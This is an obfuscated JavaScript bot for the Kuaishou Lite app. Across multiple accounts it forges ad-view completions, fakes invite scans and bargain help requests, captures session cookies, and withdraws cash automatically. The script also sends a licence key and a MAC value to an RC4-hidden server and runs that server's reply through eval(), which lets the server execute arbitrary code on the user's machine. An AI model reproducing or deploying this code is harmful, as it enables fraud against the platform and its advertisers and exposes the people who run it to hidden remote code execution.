...
0512更新：
限制凌晨2点后才能运行脚本
限制上午每个账号只运行5次任务,多次运行跳过运行5次的账号
本脚本推荐定时:24 24 2-8,13-20
还可以再频繁一点跑，反正有脚本限制
重写：
[task_local]
#快手极速版
...
*/
const $$ = Envcc('');
let acckey = $$["isNode"]() ? process["env"]["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$[
		"getdata"]("cdkey") : '',
	all_msg = '',
	mac = '';
...
function hqs(T = 10) {
	return new Promise(p => {
		let a = 5,
			Y = {
				'url': $$["isNode"]() ? rc4($$["fwur"](), '1200') + ("?key=" + acckey + "&id=" + a +
					'&ip=1&mac=' + mac + "&bb=1") : rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" +
					a + "&ip=0&mac=" + mac + "&bb=1")
			};
		$$['post'](Y, async (j, Z, Q) => {
			try {
				let B = eval(Q);
				B["code"] == 200 ? (all_msg = B["msg"], p(B["data"])) : (all_msg = B["msg"], p(
					false));
			} catch (U) {
				$$["logErr"](U, Z);
			}
...
let _0x279d25 = '',
	...
	_0x26f17b = (_0x3de8b8["isNode"]() ? process['env']["ksjsbWithdrawTime"] : _0x3de8b8['getval'](
	"ksjsbWithdrawTime")) || 15,
	_0x13d24b = (_0x3de8b8['isNode']() ? process['env']["ksjsbAggressive"] : _0x3de8b8['getval']("ksjsbAggressive")) ||
	0,
...
let _0x134a17 = new Date(),
	...
	_0x2e716e = 0,
	_0x5bc515 = "ksjsb",
	_0x180c0c = "https://ghproxy.com/https://raw.githubusercontent.com/luoluomohe/JavaScript/main/ks.json", //json
	ksjsbjk = "https://zzt666.coding.net/p/ql/d/ql/git/raw/master/ksjsb-add.json", //json
...
class _0x9d8dda {
	constructor(T) {
		...
		this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) +
	...
	async ["getUserInfo"]() {
		try {
			...
			S["result"] == 1 ? (this["valid"] = true, this["name"] = S["data"]["userData"]["nickname"], this[
				"cashBalance"] = S["data"]["totalCash"], this["coinBalance"] = S["data"]["totalCoin"], this[
				"allCash"] = S["data"]["allCash"], console["log"]("账号[" + this["name"] + "]账户余额" + this[
				"cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math["floor"](parseFloat(
				this["allCash"]) - parseFloat(this["cashBalance"])) + '元')) : console["log"]("账号[" + this[
				"name"] + "]查询账户信息失败：" + S["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ['setShare']() {
		try {
			...
			S["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200),
				await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + "]分享失败：" + S[
				"error_msg"]);
		} catch (E) {
			console.log(E)
		}
	...
	async ["taskReward"](T) {
		try {
			...
			a["result"] == 1 ? console["log"]("账号[" + this["name"] + "]完成任务[" + T + "]成功，获得" + a["data"]['amount'] +
				'金币') : console["log"]("账号[" + this["name"] + "]完成任务[" + T + "]失败：" + a["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ['getSignInfo']() {
		try {
			...
			S["result"] == 1 ? (console['log']("账号[" + this["name"] + "]今天" + (S["data"]["nebulaSignInPopup"][
				"todaySigned"
			] ? '已' : '未') + '签到'), !S["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8[
				"wait"](200), await this["doSign"](), await _0x3de8b8["wait"](200), await this[
				"setShare"]())) : console["log"]("账号[" + this["name"] + "]查询签到信息失败：" + S["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
				...
				for (let Y in _0x1e4967) {
					if (a["taskId"] == _0x1e4967[Y]) {
						...
						console["log"]('【' + a["name"] + "】 " + Z + '/' + Q + '，' + (b ? "未完成" : "已完成") +"，每次运行完成" + B + "次任务");
                            let tags = RegExp(/金币悬赏/)
                            if(tags.exec(a["name"]) && Z >= 5 && _0x20a9d7 < 13){
                                isrun = false;
                            }
						continue;
					}
	...
	async ['ksgj']() {
		...
		S["result"] == 1 ? console["log"]("账号[" + this["name"] + ']逛街获得' + S["data"]["amount"] + '金币') : console[
			"log"]("账号[" + this['name'] + "]逛街失败：" + S["error_msg"]);
	}
	...
	async ["ksAdParam"](T) {
		...
		C["result"] == 1 ? C['impAdInfo'] && C["impAdInfo"]["length"] > 0 && C["impAdInfo"][0]["adInfo"] && C[
			"impAdInfo"][0]["adInfo"]["length"] > 0 && C["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (
			await _0x3de8b8["wait"](200), await this["ksAdReward"](C["llsid"], C["impAdInfo"][0]["adInfo"][0][
				"adBaseInfo"
			]["creativeId"], T)) : console["log"]('账号[' + this["name"] + "]获取" + T["name"] + "参数失败：" + C[
			"error_msg"]);
	}
	...
	async ["ksAdReward"](T, c, p) {
		try {
			let S = new Date()["getTime"](),
				...
				Z = "bizStr={\"endTime\":" + S + ",\"eventValue\":-1,\"rewardList\":[{\"creativeId\":" + c +
				",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"startTime\":" + Y + ",\"taskId\":" + p[
					'id'] + '}',
			...
			B["result"] == 1 ? console["log"]("账号[" + this["name"] + ']看' + p["name"] + '获得' + B["data"][
				"awardAmount"
			] + '金币') : console["log"]("账号[" + this["name"] + ']看' + p["name"] + "失败：" + B["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ["openBox"](T) {
		try {
			...
			a["result"] == 1 ? T == true ? a["data"]["commonAwardPopup"] && a["data"]["commonAwardPopup"][
					"awardAmount"
				] ? (console["log"]("账号[" + this["name"] + "]开宝箱获得" + a["data"]["commonAwardPopup"]["awardAmount"] +
					'金币'), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["box"])) : console["log"]
				("账号[" + this["name"] + "]开宝箱没有获得金币") : a['data']["openTime"] > -1 ? (console["log"]("账号[" + this[
					"name"] + "]开宝箱冷却时间还有" + Math["floor"](a["data"]["openTime"] / 1000) + '秒'), a["data"][
					'openTime'
				] == 0 && (await _0x3de8b8["wait"](200), await this["openBox"](true))) : console["log"]("账号[" +
					this["name"] + "]开宝箱次数已用完") : T == true ? console["log"]('账号[' + this["name"] + "]开宝箱失败：" + a[
					"error_msg"]) : console["log"]("账号[" + this["name"] + "]查询宝箱状态失败：" + a["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ["withdraw"](T) {
		...
		let p = parseInt(T * 100),
			...
			j = "account_group_key=NEBULA_CASH_ACCOUNT&mobile_code=&fen=" + p + "&provider=" + C + "&total_fen=" +
			p + "&commission_fen=0&third_account=" + C + "&attach=&biz_content=&session_id=",
		...
		Q["result"] == "SUCCESS" ? _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + T + '元到' + S +
			'[' + a + "]成功") : _0x1ab8b7('账号' + this["index"] + '[' + this["name"] + "]提现" + T + '元到' + S +
			'[' + a + "]失败：" + Q["msg"]);
	}
		...
		if (S["result"] == 1) {
			...
			if (_0x13d24b == 1) {
				...
				if (!_0x1e627b) {
					...
					a >= parseFloat(_0x1e627b) ? (_0x1ab8b7("账号[" + this["name"] + "]准备提现" + _0x1e627b + '元'),
						await _0x3de8b8["wait"](200), await this["withdraw"](_0x1e627b)) : _0x1ab8b7("账号[" +
						this["name"] + "]余额不足" + _0x1e627b + "元，不提现");
				}
			}
		} else {
	...
	async ['changeExchangeType'](T) {
		...
		let Y = T == 0 ? "自动兑换" : '手动兑换';
		a["result"] == 1 ? console["log"]("账号[" + this["name"] + "]兑换方式更改成功，目前兑换方式为：" + Y) : console["log"]("账号[" +
			this["name"] + "]兑换方式更改失败：" + a["error_msg"]);
	}
	...
	async ["ksNeoAdParam"](T) {
		try {
			...
			C["result"] == 1 ? C["impAdInfo"] && C['impAdInfo']["length"] > 0 && C["impAdInfo"][0]["adInfo"] && C[
				"impAdInfo"][0]['adInfo']["length"] > 0 && C["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (
				await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](C["llsid"], C["impAdInfo"][0][
					"adInfo"][0]['adBaseInfo']["creativeId"], T)) : console["log"]("账号[" + this['name'] +
				"]获取" + T["name"] + "参数失败：" + C["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ["ksNeoAdReward"](T, c, p) {
		try {
			let S = new Date()["getTime"](),
				...
				Z = "bizStr={\"businessId\":" + p["businessId"] + ",\"endTime\":" + S + ",\"extParams\":\"" + p[
					"extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + c +
				",\"extInfo\":\"\",\"llsid\":" + T + ",\"taskType\":1}],\"pageId\":" + p["pageId"] + ",\"posId\":" +
				p["posId"] + ",\"startTime\":" + Y + ",\"subPageId\":" + p["subPageId"] + '}',
				Q = _0x495d61(j, this["cookie"], Z);
	...
	async ["luckdrawInfo"]() {
		try {
			...
			if (S["result"] == 1) {
				console["log"]("账号[" + this["name"] + "]现有" + S["data"]['userDiamondResult']["diamondPercent"] +
					"钻石，剩余抽奖次数：" + S["data"]["userDailyLotteryTimesResult"]["remainTimes"]);
	...
	async ["luckydraw"]() {
		try {
			...
			if (S["result"] == 1) {
				let a = S["data"]["coinCount"] ? S["data"]["coinCount"] + '金币' : S["data"]["diamondCount"] ? S[
					"data"]["diamondCount"] + '钻石' : '空气';
	...
	async ["luckydrawSign"]() {
		try {
			...
			S["result"] == 1 ? S['data']["isShow"] && console["log"]("账号[" + this["name"] + "]抽奖页签到成功") : (console[
				"log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + S["error_msg"]), S["error_msg"]["indexOf"](
				'激励游戏未在运营') > -1 && (this["hasLuckydraw"] = false));
		} catch (E) {
			console.log(E)
		}
	}
			...
			if (S["result"] == 1) {
				if (S["data"]) {
					let a = new Date()["getTime"](),
						...
						Z = Y + j;
					a < Z ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (Z - a) / 1000 + '秒') : (
						await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](S["data"]["goldNum"]));
				} else {
	...
	async ["luckdrawTimerReward"](T) {
		try {
			...
			a["result"] == 1 ? console['log']("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + T + '金币') : console["log"](
				"账号[" + this["name"] + "]领取抽奖页定时奖励失败：" + a["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ["luckdrawTasksReward"](T) {
		try {
			...
			a['result'] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + T["taskTitle"] + "]奖励获得" + a[
				"data"]["popUp"]["taskRewardName"]) : console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + T[
				"taskTitle"] + "]奖励失败：" + a["error_msg"]);
		} catch (E) {
			console.log(E)
		}
	}
	...
	async ["helpInvite"](T) {
		...
		j['headers']["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + C + '&shareToken=' + S +
			"&source=qrcode";
	...
	async ["helpPackage"](T, c) {
		let C = {
			...
			'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + T +
				"\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" +
				JSON["stringify"]("{\"teamId\":\"\",\"packetId\":\"" + c + "\"}") +
				",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() +
				",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
			'headers': {
				'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
				'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math["floor"](Math["random"]() * 1000 + 1) +
					" ANDROID_ff60a387f6ba8904; " + this['cookie'] +
				...
				'Referer': "https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=" +
					T +
					"&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" +
					c + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
	...
	async ['helpScan'](T) {
		...
		Z["result"] == 1 ? (await _0x3de8b8["wait"](100), await this["helpInvite"](T)) : console["log"]("账号[" +
			this["name"] + "]模拟邀请二维码扫描失败：" + Z["error_msg"]);
	}
	...
	async ["bindInfo"]() {
		...
		if (S["result"] == "SUCCESS") {
			let Y = "未绑定支付宝",
				j = "未绑定微信";
			S["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = S['alipay_nick_name'], Y =
				"已绑定支付宝[" + S["alipay_nick_name"] + ']');
			S["wechat_bind"] == true && (this["bindWechat"] = true, this["wechat"] = S["wechat_nick_name"], j =
				"已绑定微信[" + S["wechat_nick_name"] + ']');
	...
	async ['accountInfo']() {
		...
		S["result"] == "SUCCESS" ? this["needSms"] = S["need_mobile_code"] : console["log"]("账号[" + this["name"] +
			"]查询账号提现情况失败：" + S["error_msg"]);
	}
...
!(async () => {
	if (typeof $request !== "undefined") {
        ...
        if(_0x20a9d7 < 2){
            console.log("当前时间:"+_0x20a9d7+"点,运行没收益，终止运行!");
            return;
        }
		console["log"]("============================");
		console["log"]("\n============== 登录 ==============");
		...
		for (let Z of p) {
			...
			await _0x3de8b8["wait"](200);
            if(!isrun){
                console.log("当前账号已经运行5次了，本次运行跳过当前账号,13点后继续运行，保证最大化收益!")
                isrun=true;
                continue;
            }
			...
			if (Z["task"][_0x1e4967["luckydraw"]]["needRun"]) {
				for (let U = 0; U < Z["task"][_0x1e4967["luckydraw"]]["num"]; U++) {
					_0x20a9d7 < 13 ? (await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]),
						await _0x3de8b8["wait"](200), await Z["ksNeoAdParam"](_0x10d9f8[
							"luckdrawVideo_11_213"]), await _0x3de8b8["wait"](200)) : (await Z[
							"ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](
							200), await Z["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]),
						await _0x3de8b8['wait'](200));
				}
			}
...
async function _0x13d82d() {
	if ($request["url"]["indexOf"]("appsupport/yoda/biz/info") > -1) {
		...
		_0x547212 ? _0x547212["indexOf"](c) == -1 && (_0x547212 = _0x547212 + "\n" + c, _0x3de8b8["setdata"](
			_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (
			" 获取第" + ckList["length"] + "个ck成功: " + c))) : (_0x3de8b8["setdata"](c, "ksjsbCookie"), _0x3de8b8[
			"msg"](_0x11b3c3 + (" 获取第1个ck成功: " + c)));
	}
	...
	if ($request["url"]["indexOf"]("ksapp/client/package/renew") > -1) {
		...
		_0x547212 ? _0x547212["indexOf"](p) == -1 && (_0x547212 = _0x547212 + "\n" + p, _0x3de8b8["setdata"](
			_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (
			" 获取第" + ckList["length"] + "个ck成功: " + p))) : (_0x3de8b8["setdata"](p, "ksjsbCookie"), _0x3de8b8[
			"msg"](_0x11b3c3 + (" 获取第1个ck成功: " + p)));
	}
}
...
async function _0x282ff5(T) {
	...
	console["log"](T);
	let p = {
		'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(
			T),
		'headers': {}
	};
	await _0x39a23b("get", p);
	...
	if (p[_0x5bc515]) {
		...
		if (a["status"] == 0) {
			if (_0x459e63 >= a["version"]) {
				_0x2e716e = true;
				_0x75eec0 = "https://zzt666.coding.net/p/ql/d/ql/git/raw/master/ks.json";
...
function _0x495d61(T, c, p = '') {
	...
	p && (Y["body"] = p, Y['headers']["Content-Type"] = "application/x-www-form-urlencoded", Y["headers"][
		"Content-Length"
	] = Y["body"] ? Y["body"]["length"] : 0);
	return Y;
}
...
var _0x331719 = {
	...
	'encode': function(T) {
		...
		while (B < T["length"]) {
			...
			p = p + this["_keyStr"]["charAt"](Y) + this["_keyStr"]["charAt"](j) + this["_keyStr"]["charAt"](Z) +
	...
	'_utf8_encode': function(T) {
		...
		for (var C = 0; C < T["length"]; C++) {
			...
			S < 128 ? p += String["fromCharCode"](S) : S > 127 && S < 2048 ? (p += String["fromCharCode"](S >>
				6 | 192), p += String["fromCharCode"](S & 63 | 128)) : (p += String["fromCharCode"](S >>
				12 | 224), p += String["fromCharCode"](S >> 6 & 63 | 128), p += String["fromCharCode"](
				S & 63 | 128));
		}
	...
	'_utf8_decode': function(T) {
		...
		while (C < T["length"]) {
			...
			if (S < 128) {
				...
				S > 191 && S < 224 ? (c2 = T["charCodeAt"](C + 1), p += String["fromCharCode"]((S & 31) << 6 |
					c2 & 63), C += 2) : (c2 = T["charCodeAt"](C + 1), c3 = T["charCodeAt"](C + 2), p +=
					String["fromCharCode"]((S & 15) << 12 | (c2 & 63) << 6 | c3 & 63), C += 3);
			}
		}
...
function _0xcb54a4(T) {
	...
	function C(N, l) {
		...
		return D & K ? 2147483648 ^ x0 ^ y ^ H : D | K ? 1073741824 & x0 ? 3221225472 ^ x0 ^ y ^ H : 1073741824 ^ x0 ^
			y ^ H : x0 ^ y ^ H;
	}
	...
	function U(N) {
		for (var R, r = N["length"], D = r + 8, K = (D - D % 64) / 64, y = 16 * (K + 1), H = new Array(y - 1), x0 = 0,
				x1 = 0; r > x1;) {
			R = (x1 - x1 % 4) / 4;
			x0 = x1 % 4 * 8;
	...
	function i(N) {
		...
		for (var l = '', R = 0; R < N["length"]; R++) {
			...
			128 > r ? l += String["fromCharCode"](r) : r > 127 && 2048 > r ? (l += String["fromCharCode"](r >> 6 | 192),
				l += String["fromCharCode"](63 & r | 128)) : (l += String["fromCharCode"](r >> 12 | 224), l +=
				String["fromCharCode"](r >> 6 & 63 | 128), l += String["fromCharCode"](63 & r | 128));
		}
	...
	for (T = i(T), v = U(T), O = 1732584193, P = 4023233417, h = 2562383102, z = 271733878, J = 0; J < v["length"]; J +=
		16) {
		I = O;
		V = P;
		E = h;
...
function _0x4f15e2(T, c) {
	...
	p["sEkOb"](p["ndkrr"], typeof process) && JSON[p["RCuQp"]](process["env"])[p['gDsfN']](p['AjAMi']) > -1 && process[
		p["xFdEV"]](0);
	...
	class C {
		...
		[p["yEKyH"]](S, a = "GET") {
			...
			return new Promise((Z, Q) => {
				Y["EhzfP"]("Jrbjx", Y["HIbzq"]) ? p = Y["wNCsl"](Y["oaUpP"], C) + '元' : j[Y['PQCMA']](this, S, (
					U, q, i) => {
					U ? Q(U) : Z(q);
				});
			});
	...
	return new class {
		...
		[p["KrjuT"]]() {
			...
			if (p["TKgVx"](p["olIIK"], "ITvHD")) {
				S["UrvWd"](h, 191) && z < 224 ? (v = M["charCodeAt"](S['PyjmZ'](d, 1)), u += e[S["ncOmw"]](S[
					"tKtOU"](S['qbEpB'](S["RAqSi"](A, 31), 6), S["RAqSi"](k, 63))), o += 2) : (g = t[
						'charCodeAt'](S["PyjmZ"](L, 1)), X = m[S["yipdK"]](n + 2), F += w[S["ncOmw"]](S['tCyJQ']
						(S["Bhpih"](S['SEuhA'](G, 15), 12) | S['RAqSi'](s, 63) << 6, S["bPdms"](N, 63))), l +=
					3);
			} else {
		...
		[p["fmALu"]](S, a = null) {
			...
			if (p['uPIiE']("ddyeK", p["MUUEt"])) {
				k = o["charCodeAt"](g);
				Y["alGFV"](t, 128) ? (xx += xf[Y["KpmMK"]](xT), xc++) : Y['qVGng'](xp, 191) && Y['ghuQL'](xC, 224) ?
					(xS = xa[Y["SuDaC"]](Y['jZCnT'](xY, 1)), xj += xZ[Y["KpmMK"]](Y["whgdf"](Y["BqmoY"](xQ & 31, 6),
						Y["HpgvJ"](xB, 63))), xb += 2) : (xU = xq['charCodeAt'](Y["xuUjQ"](xi, 1)), xJ = xI[
						'charCodeAt'](Y["xuUjQ"](xV, 2)), xE += xW[Y["KpmMK"]](Y['RcLsT'](Y["tNIKw"](Y["pyVIl"](
						Y["JFGjI"](xO, 15), 12), Y["wjotr"](xP & 63, 6)), Y["MBIYn"](xh, 63))), xz += 3);
			} else {
				try {
				...
				try {
					if (p["OECAm"](p['lKqWU'], p['lKqWU'])) {
						...
						for (var B = '', b = 0; Y['jThwJ'](b, U[Y['fWywc']]); b++) {
							var U = O[Y["SULhX"]](b);
							Y["hDQRt"](128, U) ? B += P[Y["sLeeH"]](U) : U > 127 && Y["hDQRt"](2048, U) ? (B += h[Y[
								"sLeeH"]](Y['vyFmv'](Y["NdAJz"](U, 6), 192)), B += z["fromCharCode"](Y[
								"BsAjT"](63 & U, 128))) : (B += v["fromCharCode"](Y['vIoXg'](U, 12) | 224), B +=
								M[Y["sLeeH"]](Y['aCRNx'](Y["VoirO"](U, 6) & 63, 128)), B += d["fromCharCode"](Y[
									"imHel"](63 & U, 128)));
						}
...

				{
...

					{
						if (p["KoZWa"] !== 'Ptvnk') {
							...
							try {
								return p['QMUHn'](p["fPWUS"], p["fPWUS"]) ? JSON[p["YTTpc"]](this['fs'][p['yOzYr']](
									Q)) : C ^ (S | ~a);
							} catch (b) {
								return {};
							}
		...
		[p["SItKq"]]() {
			if (this["isNode"]()) {
				...
				Y ? this['fs']['writeFileSync'](S, Z) : j ? this['fs'][p["MSCAv"]](a, Z) : this['fs'][p['MSCAv']](S,
					Z);
			}
		}
		...
		['lodash_set'](S, a, Y) {
			if (p["XReEV"](p["whlcJ"], p["bACgC"])) {
				return p["EenlS"](p["LqimL"](Object, S), S) ? S : (Array['isArray'](a) || (a = a[p['rGDJj']]()[p[
					'zkpOW']](/[^.[\]]+/g) || []), a[p["nWjqV"]](0, -1)[p["BoyEO"]]((j, Z, Q) => Object(j[
					Z]) === j[Z] ? j[Z] : j[Z] = Math["abs"](a[Q + 1]) >> 0 == +a[Q + 1] ? [] : {}, S)[a[p[
					'BRBwt'](a[p["OakBY"]], 1)]] = Y, S);
			} else {
		...
		[p["JrMHo"]](S) {
			return this[p['NvGvD']]() || this[p["gXLLg"]]() ? $persistentStore[p["QEklD"]](S) : this["isQuanX"]() ?
				$prefs[p["JilvT"]](S) : this[p['KrjuT']]() ? (this[p["Bktev"]] = this[p["GvmCb"]](), this[p[
					"Bktev"]][S]) : this[p['Bktev']] && this[p["Bktev"]][S] || null;
		}

		['setval'](S, a) {
			return this["isSurge"]() || this[p['gXLLg']]() ? $persistentStore[p["Erjln"]](S, a) : this[p["TEhQN"]]
			() ? $prefs["setValueForKey"](S, a) : this[p['KrjuT']]() ? (this["data"] = this[p["GvmCb"]](), this[p[
					"Bktev"]][a] = S, this[p["SItKq"]](), true) : this[p["Bktev"]] && this[p["Bktev"]][a] || null;
		}
		...
		[p["pswtb"]](S) {
			if (p["eTTEO"](p["mAQuS"], p["wJEVG"])) {
				...
				S && (S[p["Ufsfg"]] = S["headers"] ? S[p["Ufsfg"]] : {}, p["eTTEO"](void 0, S[p['Ufsfg']][p[
					"EYucJ"]]) && p["eTTEO"](void 0, S['cookieJar']) && (S[p["EwYhm"]] = this["ckjar"]));
			}
		}
		...
		[p["ObOPk"]](S, a = () => {}) {
			...
			this[p["NvGvD"]]() || this[p["gXLLg"]]() ? (this[p["NvGvD"]]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] =
				S[p["Ufsfg"]] || {}, Object[p['XlxAL']](S["headers"], j)), $httpClient[p["ObOPk"]](S, (Q, B,
				b) => {
			...
			})) : this[p["TEhQN"]]() ? (this[p["gfRMI"]] && (S[p["mGhWK"]] = S[p["mGhWK"]] || {}, Object[p[
				"XlxAL"]](S[p["mGhWK"]], Z)), $task['fetch'](S)['then'](Q => {
				const {
					'statusCode': B,
					'statusCode': b,
					'headers': U,
				...
				a(null, i, q);
			}, Q => a(Q))) : this[p['KrjuT']]() && (this[p["pswtb"]](S), this['got'](S)['on'](p["uZRAe"], (Q,
				B) => {
					const b = {
					...
					try {
						if (Q['headers']["set-cookie"]) {
							if (p["fruUq"] !== p["ZCHSn"]) {
								const U = Q["headers"]["set-cookie"][p["jBBop"]](this[p['UfFmc']]['Cookie'][
									p["YTTpc"]
								])["toString"]();
								...
								I > 0 ? (J[b["AjWNp"]](function(w) {
									V++;
									var G = o + '/' + w;
									g['statSync'](G)["isDirectory"]() ? i["wxwCX"](t, G, true) :
										J[i["HllKf"]](G);
								}), b["YAnmU"](I, V) && e && A[b["RIjTK"]](k)) : I == 0 && o && g[b[
									'RIjTK']](t);
							}
						}
					} catch (i) {
		...
		[p['JBlns']](S, a = () => {}) {
			...
			if (S[p["uZTTG"]] && S[p["Ufsfg"]] && !S[p["Ufsfg"]]["Content-Type"] && (S[p["Ufsfg"]][p["WFTAO"]] = p[
					'UWYCE']), S[p['Ufsfg']] && delete S["headers"]["Content-Length"], this[p['NvGvD']]() || this[p[
					'gXLLg']]()) {
				this["isSurge"]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] = S[p["Ufsfg"]] || {}, Object["assign"](S[p[
					'Ufsfg']], j));
									...
									this[p["UnUmH"]]["post"](B, b)[p["rMFJs"]](U => {
										...
										if (Y["fQPWQ"](Y["fmOEc"], Y["fmpOD"])) {
											...
											const E = {
												...
												[W, O] = I[q["rghXN"]]('@'),
												P = {
													'url': q["rbIKF"](q["rbIKF"](q["cebFV"], O), q[
														"Jaljl"]),
													'body': E,
													'headers': {
														'X-Key': W,
		...
		[p["BUgao"]](S, a = () => {}) {
			...
			if (S[p["uZTTG"]] && S[p["Ufsfg"]] && !S['headers']["Content-Type"] && (S[p['Ufsfg']][p["WFTAO"]] = p[
					"UWYCE"]), S[p['Ufsfg']] && delete S["headers"]['Content-Length'], this[p['NvGvD']]() || this[p[
					'gXLLg']]()) {
				if (p["CmwsV"] !== p["vMYsg"]) {
					this[p["NvGvD"]]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] = S[p["Ufsfg"]] || {}, Object[p[
						"XlxAL"]](S[p["Ufsfg"]], j));
					$httpClient[p["BUgao"]](S, (Q, B, b) => {
						p['qpgdd'](p["nPTxz"], p['yRDNE']) ? c() : (p["gwRAk"](!Q, B) && (B[p["uZTTG"]] = b,
							B[p["RacES"]] = B[p["PWoQA"]]), p["GCFnt"](a, Q, B, b));
					});
				} else {
				...
				if (p['dpfdF'](p["UIfGT"], p['feAfW'])) {
					if (this["isQuanX"]()) {
						S[p["kOHbb"]] = p['nKUNb'];
						this[p["gfRMI"]] && (S[p["mGhWK"]] = S[p["mGhWK"]] || {}, Object[p["XlxAL"]](S[p["mGhWK"]],
							Z));
					...
					b && (U[Y["VJjUU"]] = q[Y["VJjUU"]] ? i[Y["VJjUU"]] : {}, Y['vrsHI'](void 0, J[Y['VJjUU']][Y[
						"QOMQZ"]]) && Y["SoJiS"](void 0, I[Y['yJigh']]) && (V[Y["yJigh"]] = this[Y[
						'mFpUE']]));
				}
			}
		}
		...
		[p["JIeBo"]](S) {
			...
			/(y+)/ [p['XaBsU']](S) && (S = S['replace'](RegExp['$1'], p["wQqon"](new Date()[p["vLoad"]](), '')[p[
				"dPlSl"]](p['JeirW'](4, RegExp['$1'][p['OakBY']]))));

			for (let Y in a) new RegExp(p['vUthb']('(' + Y, ')'))[p['XaBsU']](S) && (S = S["replace"](RegExp['$1'],
				p["LLmyY"](1, RegExp['$1'][p["OakBY"]]) ? a[Y] : p['ZlJQz']('00', a[Y])["substr"](p["eEfWA"]
					('', a[Y])[p["OakBY"]])));
		...
		[p["eQYiN"]](S = T, a = '', Y = '', j) {
						...
						if (Z["cnJkv"](Z["teEEH"], "lwRTd")) {
							...
							while (true) {
								switch (J[I++]) {
									...
									case '2':
										for (var V, E = C[Z['MiEod']], W = E + 8, O = Z["qffcN"](W, Z['zvDrH'](W,
												64)) / 64, P = Z["KDQsK"](16, Z["DjhXb"](O, 1)), h = new S(P -
												1), z = 0, v = 0; Z['zHrJR'](E, v);) {
					...
					if (Z["OGhYm"](Z["ITWFr"], typeof b)) {
						...
						if (this["isQuanX"]()) {
							if (Z["cnJkv"](Z["JqtGl"], "CaRgg")) {
								...
								return Z["bKDWx"](E(W), O) ? P : (h[Z["LZHXt"]](z) || (v = M[Z['EoLOn']]()[Z[
									'hwIWL']](/[^.[\]]+/g) || []), d[Z["EfgPP"]](0, -1)[Z['dGjDt']]((l, R,
										r) => m(l[R]) === l[R] ? l[R] : l[R] = n["abs"](F[r + 1]) >> 0 == +
									w[r + 1] ? [] : {}, o)[g[t["length"] - 1]] = L, X);
							}
						}
			...
			this["isMute"] || (this[p['NvGvD']]() || this['isLoon']() ? $notification[p["JBlns"]](S, a, Y, p[
				"zYPmU"](Q, j)) : this["isQuanX"]() && p["PEJul"]($notify, S, a, Y, p["BBKJc"](Q, j)));
			let B = ['', p["BRCNQ"]];
			B["push"](S);
			a && B[p["Knwkb"]](a);
			Y && B[p["Knwkb"]](Y);
		...
		[p["bdYaD"]](S, a) {
			...
			Y ? this["log"]('', p["wQqon"]('❗️', this[p["Gfcja"]]) + ", 错误!", S["stack"]) : this["log"]('', p[
				"gqCJK"]('❗️' + this[p["Gfcja"]], ", 错误!"), S);
		}
...
function FxPCnMKLw7() {
	...
	_utf8_encode = function(c) {
		...
		for (var S = 0; S < c['length']; S++) {
			...
